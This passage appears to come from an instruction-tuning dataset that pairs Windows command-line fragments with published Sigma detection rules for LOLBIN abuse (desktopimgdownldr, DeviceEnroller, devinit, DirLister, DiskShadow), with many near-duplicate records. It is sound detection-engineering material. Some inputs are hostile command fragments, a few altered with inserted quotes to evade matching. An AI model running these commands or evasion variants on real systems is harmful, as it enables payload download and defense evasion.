environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/lockscreenurl: .jpg .jpeg .png reg delete \\PersonalizationCSP", "output": "title: Suspicious Desktopimgdownldr Command\nid: bb58aa4a-b80b-415a-a2c0-2f65a4c81009\nstatus: test\ndescription: Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet\nreferences:\n    - https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n    - https://twitter.com/SBousseaden/status/1278977301745741825\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-07-03\nmodified: 2021-11-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: ' /lockscreenurl:'\n    selection1_filter:\n        CommandLine|contains:\n            - '.jpg'\n            - '.jpeg'\n            - '.png'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'reg delete'\n            - '\\PersonalizationCSP'\n    condition: ( selection1 and not selection1_filter ) or selection_reg\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\deviceenroller.exe deviceenroller.exe /PhoneDeepLink", "output": "title: Potential DLL Sideloading Via DeviceEnroller.EXE\nid: e173ad47-4388-4012-ae62-bd13f71c18a8\nrelated:\n    - id: ee4c5d06-3abc-48cc-8885-77f1c20f4451\n      type: similar\nstatus: test\ndescription: |\n    Detects the use of the PhoneDeepLink parameter to potentially sideload a DLL file that does not exist. This non-existent DLL file is named \"ShellChromeAPI.dll\".\n    Adversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\nreferences:\n    - https://mobile.twitter.com/0gtweet/status/1564131230941122561\n    - https://strontic.github.io/xcyclopedia/library/DeviceEnroller.exe-24BEF0D6B0ECED36BB41831759FDE18D.html\nauthor: '@gott_cyber'\ndate: 2022-08-29\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\deviceenroller.exe'\n        - OriginalFileName: 'deviceenroller.exe'\n    selection_cli:\n        CommandLine|contains: '/PhoneDeepLink'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\deviceenroller.exe \"deviceenroller.exe\" /PhoneDeepLink", "output": "title: Potential DLL Sideloading Via DeviceEnroller.EXE\nid: e173ad47-4388-4012-ae62-bd13f71c18a8\nrelated:\n    - id: ee4c5d06-3abc-48cc-8885-77f1c20f4451\n      type: similar\nstatus: test\ndescription: |\n    Detects the use of the PhoneDeepLink parameter to potentially sideload a DLL file that does not exist. This non-existent DLL file is named \"ShellChromeAPI.dll\".\n    Adversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\nreferences:\n    - https://mobile.twitter.com/0gtweet/status/1564131230941122561\n    - https://strontic.github.io/xcyclopedia/library/DeviceEnroller.exe-24BEF0D6B0ECED36BB41831759FDE18D.html\nauthor: '@gott_cyber'\ndate: 2022-08-29\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\deviceenroller.exe'\n        - OriginalFileName: 'deviceenroller.exe'\n    selection_cli:\n        CommandLine|contains: '/PhoneDeepLink'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\deviceenroller deviceenroller /PhoneDeepLink", "output": "title: Potential DLL Sideloading Via DeviceEnroller.EXE\nid: e173ad47-4388-4012-ae62-bd13f71c18a8\nrelated:\n    - id: ee4c5d06-3abc-48cc-8885-77f1c20f4451\n      type: similar\nstatus: test\ndescription: |\n    Detects the use of the PhoneDeepLink parameter to potentially sideload a DLL file that does not exist. This non-existent DLL file is named \"ShellChromeAPI.dll\".\n    Adversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\nreferences:\n    - https://mobile.twitter.com/0gtweet/status/1564131230941122561\n    - https://strontic.github.io/xcyclopedia/library/DeviceEnroller.exe-24BEF0D6B0ECED36BB41831759FDE18D.html\nauthor: '@gott_cyber'\ndate: 2022-08-29\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\deviceenroller.exe'\n        - OriginalFileName: 'deviceenroller.exe'\n    selection_cli:\n        CommandLine|contains: '/PhoneDeepLink'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\deviceenroller.exe deviceenroller.exe /PhoneDeepLink", "output": "title: Potential DLL Sideloading Via DeviceEnroller.EXE\nid: e173ad47-4388-4012-ae62-bd13f71c18a8\nrelated:\n    - id: ee4c5d06-3abc-48cc-8885-77f1c20f4451\n      type: similar\nstatus: test\ndescription: |\n    Detects the use of the PhoneDeepLink parameter to potentially sideload a DLL file that does not exist. This non-existent DLL file is named \"ShellChromeAPI.dll\".\n    Adversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\nreferences:\n    - https://mobile.twitter.com/0gtweet/status/1564131230941122561\n    - https://strontic.github.io/xcyclopedia/library/DeviceEnroller.exe-24BEF0D6B0ECED36BB41831759FDE18D.html\nauthor: '@gott_cyber'\ndate: 2022-08-29\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\deviceenroller.exe'\n        - OriginalFileName: 'deviceenroller.exe'\n    selection_cli:\n        CommandLine|contains: '/PhoneDeepLink'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-t msi-install -i http", "output": "title: Arbitrary MSI Download Via Devinit.EXE\nid: 90d50722-0483-4065-8e35-57efaadd354d\nstatus: test\ndescription: Detects a certain command line flag combination used by \"devinit.exe\", which can be abused as a LOLBIN to download arbitrary MSI packages on a Windows system\nreferences:\n    - https://twitter.com/mrd0x/status/1460815932402679809\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devinit/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-04-06\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' -t msi-install '\n            - ' -i http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-t \"msi-i\"nstall -i http", "output": "title: Arbitrary MSI Download Via Devinit.EXE\nid: 90d50722-0483-4065-8e35-57efaadd354d\nstatus: test\ndescription: Detects a certain command line flag combination used by \"devinit.exe\", which can be abused as a LOLBIN to download arbitrary MSI packages on a Windows system\nreferences:\n    - https://twitter.com/mrd0x/status/1460815932402679809\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devinit/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-04-06\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' -t msi-install '\n            - ' -i http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-t http -i msi-install", "output": "title: Arbitrary MSI Download Via Devinit.EXE\nid: 90d50722-0483-4065-8e35-57efaadd354d\nstatus: test\ndescription: Detects a certain command line flag combination used by \"devinit.exe\", which can be abused as a LOLBIN to download arbitrary MSI packages on a Windows system\nreferences:\n    - https://twitter.com/mrd0x/status/1460815932402679809\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devinit/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-04-06\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' -t msi-install '\n            - ' -i http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "DirLister.exe \\dirlister.exe", "output": "title: DirLister Execution\nid: b4dc61f5-6cce-468e-a608-b48b469feaa2\nstatus: test\ndescription: Detect the usage of \"DirLister.exe\" a utility for quickly listing folder or drive contents. It was seen used by BlackCat ransomware to create a list of accessible directories and files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1083/T1083.md\n    - https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.t1083\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'DirLister.exe'\n        - Image|endswith: '\\dirlister.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by users\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "DirLister.exe \"\\dirlister.exe\"", "output": "title: DirLister Execution\nid: b4dc61f5-6cce-468e-a608-b48b469feaa2\nstatus: test\ndescription: Detect the usage of \"DirLister.exe\" a utility for quickly listing folder or drive contents. It was seen used by BlackCat ransomware to create a list of accessible directories and files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1083/T1083.md\n    - https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.t1083\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'DirLister.exe'\n        - Image|endswith: '\\dirlister.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by users\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "DirLister \\dirlister", "output": "title: DirLister Execution\nid: b4dc61f5-6cce-468e-a608-b48b469feaa2\nstatus: test\ndescription: Detect the usage of \"DirLister.exe\" a utility for quickly listing folder or drive contents. It was seen used by BlackCat ransomware to create a list of accessible directories and files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1083/T1083.md\n    - https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.t1083\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'DirLister.exe'\n        - Image|endswith: '\\dirlister.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by users\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "DirLister.exe \\dirlister.exe", "output": "title: DirLister Execution\nid: b4dc61f5-6cce-468e-a608-b48b469feaa2\nstatus: test\ndescription: Detect the usage of \"DirLister.exe\" a utility for quickly listing folder or drive contents. It was seen used by BlackCat ransomware to create a list of accessible directories and files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1083/T1083.md\n    - https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.t1083\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'DirLister.exe'\n        - Image|endswith: '\\dirlister.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by users\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\diskshadow.exe \\certutil.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\wscript.exe", "output": "title: Potentially Suspicious Child Process Of DiskShadow.EXE\nid: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8\nrelated:\n    - id: fa1a7e52-3d02-435b-81b8-00da14dd66c1 # Diskshadow Script Mode - Execution From Potential Suspicious Location\n      type: similar\n    - id: 1dde5376-a648-492e-9e54-4241dd9b0c7f # Diskshadow Script Mode - Uncommon Script Extension Execution\n      type: similar\n    - id: 56b1dde8-b274-435f-a73a-fb75eb81262a # Diskshadow Child Process Spawned\n      type: similar\n    - id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2 # Diskshadow Script Mode Execution\n      type: similar\nstatus: test\ndescription: Detects potentially suspicious child processes of \"Diskshadow.exe\". This could be an attempt to bypass parent/child relationship detection or application whitelisting rules.\nreferences:\n    - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\n    - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf\n    - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware\n    - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-15\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\diskshadow.exe'\n        Image|endswith:\n            # Note: add or remove additional binaries according to your org needs\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - False postitve can occur in cases where admin scripts levreage the \"exec\" flag to execute applications\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\diskshadow.exe \\certutil.exe \"\\cscript.exe\" \\mshta.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\wscript.exe", "output": "title: Potentially Suspicious Child Process Of DiskShadow.EXE\nid: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8\nrelated:\n    - id: fa1a7e52-3d02-435b-81b8-00da14dd66c1 # Diskshadow Script Mode - Execution From Potential Suspicious Location\n      type: similar\n    - id: 1dde5376-a648-492e-9e54-4241dd9b0c7f # Diskshadow Script Mode - Uncommon Script Extension Execution\n      type: similar\n    - id: 56b1dde8-b274-435f-a73a-fb75eb81262a # Diskshadow Child Process Spawned\n      type: similar\n    - id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2 # Diskshadow Script Mode Execution\n      type: similar\nstatus: test\ndescription: Detects potentially suspicious child processes of \"Diskshadow.exe\". This could be an attempt to bypass parent/child relationship detection or application whitelisting rules.\nreferences:\n    - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\n    - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf\n    - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware\n    - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-15\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\diskshadow.exe'\n        Image|endswith:\n            # Note: add or remove additional binaries according to your org needs\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - False postitve can occur in cases where admin scripts levreage the \"exec\" flag to execute applications\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\diskshadow \\certutil \\cscript \\mshta \\powershell \\pwsh \\regsvr32 \\rundll32 \\wscript", "output": "title: Potentially Suspicious Child Process Of DiskShadow.EXE\nid: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8\nrelated:\n    - id: fa1a7e52-3d02-435b-81b8-00da14dd66c1 # Diskshadow Script Mode - Execution From Potential Suspicious Location\n      type: similar\n    - id: 1dde5376-a648-492e-9e54-4241dd9b0c7f # Diskshadow Script Mode - Uncommon Script Extension Execution\n      type: similar\n    - id: 56b1dde8-b274-435f-a73a-fb75eb81262a # Diskshadow Child Process Spawned\n      type: similar\n    - id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2 # Diskshadow Script Mode Execution\n      type: similar\nstatus: test\ndescription: Detects potentially suspicious child processes of \"Diskshadow.exe\". This could be an attempt to bypass parent/child relationship detection or application whitelisting rules.\nreferences:\n    - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\n    - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf\n    - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware\n    - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-15\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\diskshadow.exe'\n        Image|endswith:\n            # Note: add or remove additional binaries according to your org needs\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - False postitve can occur in cases where admin scripts levreage the \"exec\" flag to execute applications\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\diskshadow.exe \\certutil.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\wscript.exe", "output": "title: Potentially Suspicious Child Process Of DiskShadow.EXE\nid: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8\nrelated:\n    - id: fa1a7e52-3d02-435b-81b8-00da14dd66c1 # Diskshadow Script Mode - Execution From Potential Suspicious Location\n      type: similar\n    - id: 1dde5376-a648-492e-9e54-4241dd9b0c7f # Diskshadow Script Mode - Uncommon Script Extension Execution\n      type: similar\n    - id: 56b1dde8-b274-435f-a73a-fb75eb81262a # Diskshadow Child Process Spawned\n      type: similar\n    - id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2 # Diskshadow Script Mode Execution\n      type: similar\nstatus: test\ndescription: Detects potentially suspicious child processes of \"Diskshadow.exe\". This could be an attempt to bypass parent/child relationship detection or application whitelisting rules.\nreferences:\n    - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\n    - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf\n    - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware\n    - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-15\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\diskshadow.exe'\n        Image|endswith:\n            # Note: add or remove additional binaries according to your org needs\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - False postitve can occur in cases where admin scripts levreage the \"exec\" flag to execute applications\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "diskshadow.exe \\diskshadow.exe -s .txt", "output": "title: Diskshadow Script Mode - Uncommon Script Extension Execution\nid: 1dde5376-a648-492e-9e54-4241dd9b0c7f\nrelated:\n    - id: fa1a7e52-3d02-435b-81b8-00da14dd66c1 # Diskshadow Script Mode - Execution From Potential Suspicious Location\n      type: similar\n    - id: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8 # Potentially Suspicious Child Process Of DiskShadow.EXE\n      type: similar\n    - id: 56b1dde8-b274-435f-a73a-fb75eb81262a # Diskshadow Child Process Spawned\n      type: similar\n    - id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2 # Diskshadow Script Mode Execution\n      type: similar\nstatus: test\ndescription: |\n    Detects execution of \"Diskshadow.exe\" in script mode to execute an script with a potentially uncommon extension.\n    Initial baselining of the allowed extension list is required.\nreferences:\n    - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\n    - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf\n    - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware\n    - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'diskshadow.exe'\n        - Image|endswith: '\\diskshadow.exe'\n    selection_flag:\n        CommandLine|contains|windash: '-s '\n    filter_main_ext:\n        # Note: can be changed to an \"endswith\" to avoid rare FPs. But you need to account for quoted paths\n        # Note: Using the \".txt\" is based on the MS documentation example. Best add the extension you use internally before using this rule\n        CommandLine|contains: '.txt'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - False postitve might occur with legitimate or uncommon extensions used internally. Initial baseline is required.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "diskshadow.exe \\\"\\disksh\\\"adow.exe -s .txt", "output": "title: Diskshadow Script Mode - Uncommon Script Extension Execution\nid: 1dde5376-a648-492e-9e54-4241dd9b0c7f\nrelated:\n    - id: fa1a7e52-3d02-435b-81b8-00da14dd66c1 # Diskshadow Script Mode - Execution From Potential Suspicious Location\n      type: similar\n    - id: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8 # Potentially Suspicious Child Process Of DiskShadow.EXE\n      type: similar\n    - id: 56b1dde8-b274-435f-a73a-fb75eb81262a # Diskshadow Child Process Spawned\n      type: similar\n    - id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2 # Diskshadow Script Mode Execution\n      type: similar\nstatus: test\ndescription: |\n    Detects execution of \"Diskshadow.exe\" in script mode to execute an script with a potentially uncommon extension.\n    Initial baselining of the allowed extension list is required.\nreferences:\n    - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\n    - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf\n    - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware\n    - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'diskshadow.exe'\n        - Image|endswith: '\\diskshadow.exe'\n    selection_flag:\n        CommandLine|contains|windash: '-s '\n    filter_main_ext:\n        # Note: can be changed to an \"endswith\" to avoid rare FPs. But you need to account for quoted paths\n        # Note: Using the \".txt\" is based on the MS documentation example. Best add the extension you use internally before using this rule\n        CommandLine|contains: '.txt'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - False postitve might occur with legitimate or uncommon extensions used internally. Initial baseline is required.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "diskshadow \\diskshadow -s .txt", "output": "title: Diskshadow Script Mode - Uncommon Script Extension Execution\nid: 1dde5376-a648-492e-9e54-4241dd9b0c7f\nrelated:\n    - id: fa1a7e52-3d02-435b-81b8-00da14dd66c1 # Diskshadow Script Mode - Execution From Potential Suspicious Location\n      type: similar\n    - id: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8 # Potentially Suspicious Child Process Of DiskShadow.EXE\n      type: similar\n    - id: 56b1dde8-b274-435f-a73a-fb75eb81262a # Diskshadow Child Process Spawned\n      type: similar\n    - id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2 # Diskshadow Script Mode Execution\n      type: similar\nstatus: test\ndescription: |\n    Detects execution of \"Diskshadow.exe\" in script mode to execute an script with a potentially uncommon extension.\n    Initial baselining of the allowed extension list is required.\nreferences:\n    - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\n    - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf\n    - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware\n    - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'diskshadow.exe'\n        - Image|endswith: '\\diskshadow.exe'\n    selection_flag:\n        CommandLine|contains|windash: '-s '\n    filter_main_ext:\n        # Note: can be changed to an \"endswith\" to avoid rare FPs. But you need to account for quoted paths\n        # Note: Using the \".txt\" is based on the MS documentation example. Best add the extension you use internally before using this rule\n        CommandLine|contains: '.txt'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - False postitve might occur with legitimate or uncommon extensions used internally. Initial baseline is required.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "diskshadow.exe .txt \\diskshadow.exe -s", "output": "title: Diskshadow Script Mode - Uncommon Script Extension Execution\nid: 1dde5376-a648-492e-9e54-4241dd9b0c7f\nrelated:\n    - id: fa1a7e52-3d02-435b-81b8-00da14dd66c1 # Diskshadow Script Mode - Execution From Potential Suspicious Location\n      type: similar\n    - id: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8 # Potentially Suspicious Child Process Of DiskShadow.EXE\n      type: similar\n    - id: 56b1dde8-b274-435f-a73a-fb75eb81262a # Diskshadow Child Process Spawned\n      type: similar\n    - id: 0c2f8629-7129-4a8a-9897-7e0768f13ff2 # Diskshadow Script Mode Execution\n      type: similar\nstatus: test\ndescription: |\n    Detects execution of \"Diskshadow.exe\" in script mode to execute an script with a potentially uncommon extension.\n    Initial baselining of the allowed extension list is required.\nreferences:\n    - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\n    - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf\n    - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware\n    - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    